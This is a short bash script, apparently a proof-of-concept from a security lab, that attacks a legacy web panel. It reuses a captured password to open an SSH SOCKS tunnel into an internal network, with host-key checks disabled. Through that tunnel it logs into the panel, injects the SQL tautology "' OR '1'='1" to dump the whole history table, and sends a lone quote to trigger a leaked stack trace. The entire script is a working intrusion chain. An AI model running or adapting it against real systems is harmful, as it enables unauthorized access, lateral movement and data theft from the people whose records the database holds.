#!/bin/bash
# Manual proof on panel v1: the classic tautology returns the whole table. Legacy stack only.
set -uo pipefail
: "${CAPTURED_PASSWORD:?}"
PANEL=http://172.28.0.20:5000
SOCKS=socks5h://127.0.0.1:1085
sshpass -p "$CAPTURED_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N -f -D 1085 coordenadora@172.29.0.2 2>/dev/null
sleep 2
curl -s -x "$SOCKS" -c /tmp/jar2 -o /dev/null -d "username=coordenadora&password=$CAPTURED_PASSWORD" "$PANEL/login"
normal=$(curl -s -x "$SOCKS" -b /tmp/jar2 -G "$PANEL/history" --data-urlencode "q=escola" | grep -o '<tr>' | wc -l)
tautology=$(curl -s -x "$SOCKS" -b /tmp/jar2 -G "$PANEL/history" --data-urlencode "q=' OR '1'='1" | grep -o '<tr>' | wc -l)
# A lone quote breaks the query: the response exposes the stack trace and the SQL.
leak=$(curl -s -x "$SOCKS" -b /tmp/jar2 -G "$PANEL/history" --data-urlencode "q='" | grep -c -E 'Traceback|psycopg')
echo "rows_normal=$normal rows_or=$tautology stack_trace_lines=$leak" | tee /out/v1_manual_or.txt
